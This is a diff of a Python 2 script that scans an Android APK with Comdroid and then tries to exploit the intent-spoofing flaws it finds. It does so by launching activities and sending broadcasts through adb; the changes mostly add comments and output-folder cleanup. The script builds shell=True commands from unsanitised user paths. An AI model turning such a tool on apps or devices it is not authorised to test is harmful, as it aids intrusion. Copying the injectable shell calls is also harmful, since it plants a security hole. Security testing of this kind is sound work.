@@ -2,8 +2,11 @@ import subprocess
 import os
 import sys
 import xml.etree.ElementTree as ET
+import shutil
 
-#Types are "Activity" or "Broadcast"
+
+#Class to hold vulnerability details
+#Vuln.type will be either "Activity" or "Broadcast"
 class Vuln:
 	def __init__(self, vs):
 		self.vulnString = vs
@@ -31,6 +34,7 @@ class Vuln:
 		except:
 			return(self.vulnString)
 
+
 def checkPathForADB():
 	try:
 		subprocess.call(["adb"], stderr=subprocess.STDOUT, stdout = subprocess.PIPE)
@@ -38,6 +42,8 @@ def checkPathForADB():
 		print "Make sure your $PATH environment variables includes the path to adb."
 		sys.exit(0)	
 
+
+#Attempt to launch the provided activity
 def startActivity(package, activity):
 	cmd = 'adb shell am start -n ' + package + '/' + activity
 	try:
@@ -52,6 +58,8 @@ def startActivity(package, activity):
 		return 1
 	return 0
 
+
+#Attempt to send the specified broadcast intent
 def sendBroadcast(broadcast):
 	cmd = "adb shell am broadcast -a " + broadcast
 	try:
@@ -66,12 +74,23 @@ def sendBroadcast(broadcast):
 		return 1
 	return 0
 
+
+#Run Comdroid utility, parse results into Vuln objections
 def runComDroidScan():
 	apk = raw_input("Enter the path to the apk you want to attack.\n").rstrip()
-	
-	#TODO: better output file handling
 	output = raw_input("Enter the path to the directory where you want output to be stored.\n").rstrip()
+	
+	#Create or clear output folder
+	if not os.path.isdir(output):
+		os.makedirs(output)
+	else:
+		shutil.rmtree(output + "/dedex")
+		shutil.rmtree(output + "/IntentResults")
+		shutil.rmtree(output + "/log")
+		shutil.rmtree(output + "/unzip")
+		os.remove(output + "/AndroidManifest.xml")
 
+	#Run Comdroid utility
 	try:
 		subprocess.call(["./runComDroid.sh "+apk+" "+output], shell=True,
 						 stderr = subprocess.STDOUT, stdout=subprocess.PIPE)
@@ -79,6 +98,7 @@ def runComDroidScan():
 		print err
 		sys.exit(0)
 
+	#Parse Comdroid output into Vuln objects
 	outputFile = open(output+"/IntentResults/allWarnings", 'r')
 	spoofVulns = []
 	for line in outputFile:
@@ -91,17 +111,20 @@ def runComDroidScan():
 	else:
 		print str(len(spoofVulns)) + " intent spoofing vulnerabilities found."
 		exploitVulns(spoofVulns, output)
+		
 
+#Show user discovered vulns and run exploits
 def exploitVulns(spoofVulns, output):
 	for i in range(len(spoofVulns)):
 		print "Vulnerability " + str(i+1) + ":"
 		print spoofVulns[i]
 
-
 	i = int(raw_input("Enter the number of the vulnerability you'd like to exploit (0 to quit): ")) - 1
 	while (i != -1):
 		if (spoofVulns[i].type == "Activity"):
 			print "Attempting to exploit Activity Launch vulnerability " + str(i) + "..."
+
+			#Parse activity and package names from vuln, attempt to start activity
 			a = spoofVulns[i].activity
 			package = a[:a.rfind('.')]
 			activity = a[a.rfind('.'):]
@@ -111,7 +134,7 @@ def exploitVulns(spoofVulns, output):
 		if (spoofVulns[i].type == "Broadcast"):
 			print "Attempting to exploit Broadcast Injection vulnerability " + str(i) + "..."
 
-			#find activity in manifest and parse out intent filters
+			#Find activity in manifest and parse out intent filters. Attempt to start each intent.
 			a = spoofVulns[i].activity
 			tree = ET.parse(output+"/AndroidManifest.xml")
 			root = tree.getroot()
@@ -135,13 +158,4 @@ def exploitVulns(spoofVulns, output):
 
 checkPathForADB()
 runComDroidScan()
-
-# /Users/admin/Documents/AndroidIntentSpoofing/Apps/HelloWorld/app/build/apk/app-debug-unaligned.apk
-#TODO: add verbose mode that outputs scanning details.
-
-
-
-
-
-
 
